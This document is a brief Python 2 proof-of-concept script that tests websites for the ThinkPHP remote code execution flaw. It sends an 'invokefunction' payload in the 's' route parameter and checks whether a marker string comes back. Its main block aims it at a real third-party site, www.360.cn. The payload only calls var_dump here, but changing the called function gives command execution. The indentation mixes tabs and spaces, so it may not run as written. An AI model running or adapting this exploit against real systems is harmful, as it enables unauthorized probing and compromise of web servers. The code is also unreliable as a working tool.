#!/usr/bin/env python		
#coding:utf-8
import requests

payload = "/index.php?s=index/\\think\\app|invokefunction&function=var_dump&vars[]=rivirtest"

def poc(url):
    try:
    	print url
        return __poc(url)
    except Exception,e:
        print e



def __poc(url):
	headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'}
	url = url if '://' in url else 'http://' + url
	url = url.strip('/')
	url = url + payload
	print url
	res = requests.get(url=url,headers=headers)
	#print res.text
	if 'rivirtest' in res.text:
		print 'website has vul'
	else:
		print 'fixed'


if __name__ == '__main__':
	poc('https://www.360.cn/')
